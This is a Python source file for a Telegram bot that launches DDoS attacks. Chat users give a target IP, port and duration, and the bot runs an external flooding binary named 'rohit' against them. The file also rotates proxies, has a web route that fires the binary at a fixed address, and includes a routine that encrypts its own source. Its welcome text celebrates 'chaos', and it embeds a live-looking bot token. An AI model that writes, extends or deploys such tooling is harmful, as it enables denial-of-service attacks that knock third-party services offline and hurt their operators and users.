import os
import telebot
import logging
import subprocess
import random
import time
import asyncio
from threading import Thread
from flask import Flask
from cryptography.fernet import Fernet

# Instructions:
# 1. Ensure that the binary file named 'rohit' is present and executable in the same directory as this script.
# 2. Install the required cryptography library using the command:
#    pip install cryptography
# 3. Run this script. It will execute the 'rohit' binary with specified IP, port, and duration, and then encrypt itself into 'encrypted_script.py'.
# 4. The encryption key will be saved in 'encryption_key.key'.

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Configuration
TOKEN = '7776000937:AAHKMHSG3ufl65CUuVQ4ioxGijx1hBj9tqA'  # Replace with your bot token
CHANNEL_ID = -1002188746287

# Initialize the bot
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Asyncio event loop
loop = asyncio.get_event_loop()

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678",
        # ... (other proxies)
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

# Function to check for other binaries
def check_for_other_binaries():
    for item in os.listdir('.'):
        if os.path.isfile(item) and item != 'rohit' and item.endswith(('.exe', '.bin', '')):
            return True
    return False

# Function to run the binary with parameters
def run_binary(ip, port, duration):
    if check_for_other_binaries():
        print("Error: No other binaries should be present in the directory.")
        return
    try:
        # Run the binary named 'rohit' with specified parameters
        subprocess.run(["./rohit", ip, str(port), str(duration), '100'], check=True)  # Ensure the path to 'rohit' binary is correct
    except Exception as e:
        print(f"Error running binary: {e}")

# Function to encrypt the script
def encrypt_script():
    # Generate a key for encryption
    key = Fernet.generate_key()
    cipher = Fernet(key)

    # Read the current script
    with open(__file__, 'rb') as file:
        original_script = file.read()

    # Encrypt the script
    encrypted_script = cipher.encrypt(original_script)

    # Save the encrypted script
    with open("encrypted_script.py", 'wb') as encrypted_file:
        encrypted_file.write(encrypted_script)

    # Save the encryption key
    with open("encryption_key.key", 'wb') as key_file:
        key_file.write(key)

    print("Script encrypted successfully.")

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    bot.send_message(message.chat.id, "*💣 Ready to launch an attack?*\n"
                                      "*Please provide the target IP, port, and duration in seconds.*\n"
                                      "*Example: 167.67.25 6296 60* 🔥\n"
                                      "*Let the chaos begin! 🎉*", parse_mode='Markdown')

    bot.register_next_step_handler(message, process_attack_command)

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ Error!*\n"
                                               "*Please use the correct format and try again.*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*\n"
                                               "*Please select a different port to proceed.*", parse_mode='Markdown')
            return
        if duration >= 600:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 599 seconds.*\n"
                                               "*Please shorten the duration and try again!*", parse_mode='Markdown')
            return

        # Start the binary with the specified parameters
        run_binary(target_ip, target_port, duration)

        bot.send_message(message.chat.id, f"*🚀 Attack Launched! 🚀*\n\n"
                                           f"*📡 Target Host: {target_ip}*\n"
                                           f"*👉 Target Port: {target_port}*\n"
                                           f"*⏰ Duration: {duration} seconds! Let the chaos unfold! 🔥*", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "*❌ No attack is currently in progress!*\n"
                              "*🔄 Feel free to initiate your attack whenever you're ready!*", parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*🌟 Welcome to the Ultimate Command Center!*\n\n"
                 "*Here’s what you can do:* \n"
                 "1. *`/attack` - ⚔️ Launch a powerful attack and show your skills!*\n"
                 "2. *`/when` - ⏳ Curious about the bot's status? Find out now!*\n"
                 "*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*")

    try:
        bot.send_message(message.chat.id, help_text, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error while processing /help command: {e}")

@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
                                           "*🚀 Get ready to dive into the action!*\n\n"
                                           "*💣 To unleash your power, use the* `/attack` *command followed by your target's IP and port.* ⚔️\n\n"
                                           "*🔍 Example: After* `/attack`, *enter:* `ip port duration`.\n\n"
                                           "*⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign!* 😈💥", 
                                           parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error while processing /start command: {e}")

# Flask Setup
app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello, World!'

@app.route('/run_c_code')
def run_c_code():
    result = subprocess.run(["./rohit", "192.168.0.1", "12345", "60", "4"], capture_output=True, text=True)
    return result.stdout

if __name__ == '__main__':
    asyncio_thread = Thread(target=start_asyncio_loop, daemon=True)
    asyncio_thread.start()

    flask_thread = Thread(target=app.run, daemon=True)
    flask_thread.start()

    logging.info("Starting Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        time.sleep(REQUEST_INTERVAL)
